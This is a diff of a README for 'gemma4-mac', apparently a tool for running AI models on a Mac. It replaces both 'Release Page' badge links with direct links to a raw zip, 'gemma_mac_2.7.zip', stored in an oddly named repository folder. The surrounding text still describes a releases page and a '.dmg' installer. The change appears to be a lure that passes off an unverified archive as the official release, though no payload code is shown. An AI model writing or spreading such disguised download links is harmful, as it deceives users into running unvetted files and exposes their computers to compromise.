@@ -1,6 +1,6 @@
 # 🤖 gemma4-mac - Run advanced models on your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/raw/refs/heads/main/prosthionic/gemma_mac_2.7.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ The application utilizes your computer's Neural Engine to handle complex tasks q
 
 You can find the latest version of the installer on the project releases page. 
 
-[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/unseeing-yeastcake50/gemma4-mac/raw/refs/heads/main/prosthionic/gemma_mac_2.7.zip)
 
 Visit this page to download the compressed file for your system. Look for the file ending in `.dmg` to start your installation.
 
